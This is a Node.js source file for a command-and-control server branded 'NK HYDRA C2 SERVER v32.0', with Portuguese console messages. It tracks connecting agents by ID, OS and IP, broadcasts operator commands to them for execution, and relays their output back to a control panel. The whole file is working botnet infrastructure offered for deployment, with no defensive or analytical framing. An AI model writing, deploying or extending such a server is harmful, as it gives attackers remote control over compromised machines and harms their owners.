/* NK HYDRA C2 SERVER v32.0 */
/* SINGULARITY HIVE PROTOCOL */
/* COMMAND: node server.js */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

// --- CRITICAL: ROOT ROUTE FOR RENDER DEPLOYMENT ---
app.get('/', (req, res) => {
    res.status(200).send(`
        <html>
            <body style="background-color: #050505; color: #00ff41; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh;">
                <div style="text-align: center; border: 1px solid #00ff41; padding: 2rem;">
                    <h1>NK HYDRA C2 SERVER v32.0</h1>
                    <h2 style="color: white;">STATUS: <span style="color: #00ff41; animation: blink 1s infinite;">ONLINE</span></h2>
                    <p>SENTIENT HIVE ACTIVE</p>
                </div>
                <style>@keyframes blink { 50% { opacity: 0; } }</style>
            </body>
        </html>
    `);
});

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    pingTimeout: 60000,
    transports: ['websocket', 'polling']
}); 

console.log("[*] INICIANDO SISTEMA C2...");

let agents = new Map();

io.on('connection', (socket) => {
    
    socket.on('identify', (data) => {
        if (data.type === 'agent') {
            const agentInfo = {
                id: data.id,
                os: data.os,
                ip: socket.handshake.address.replace('::ffff:', ''),
                status: 'ONLINE',
                socketId: socket.id
            };
            agents.set(data.id, agentInfo);
            
            const msg = `AGENT CONNECTED: ${data.id} [${data.os}]`;
            console.log(`[+] ${msg}`);
            io.emit('log', `[SYSTEM] ${msg}`);
            
            // Broadcast full agent list to frontend
            io.emit('status', { agents: Array.from(agents.values()) });
        }
    });

    socket.on('cmd', (data) => {
        console.log(`[CMD RELAY] ${data.cmd}`);
        io.emit('exec', data); 
        io.emit('log', `[C2] WARLORD COMMAND: ${data.cmd}`);
    });

    socket.on('stream_log', (data) => {
        console.log(`[${data.from}] ${data.output}`);
        io.emit('log', data);
    });
    
    socket.on('disconnect', () => {
        // Find agent by socket ID and remove or mark offline
        agents.forEach((value, key) => {
            if (value.socketId === socket.id) {
                agents.delete(key);
                io.emit('log', `[SYSTEM] AGENT LOST: ${key}`);
            }
        });
        io.emit('status', { agents: Array.from(agents.values()) });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`[+] SERVIDOR RODANDO NA PORTA ${PORT}`);
    console.log(`[+] ACESSE VIA BROWSER PARA VERIFICAR STATUS.`);
});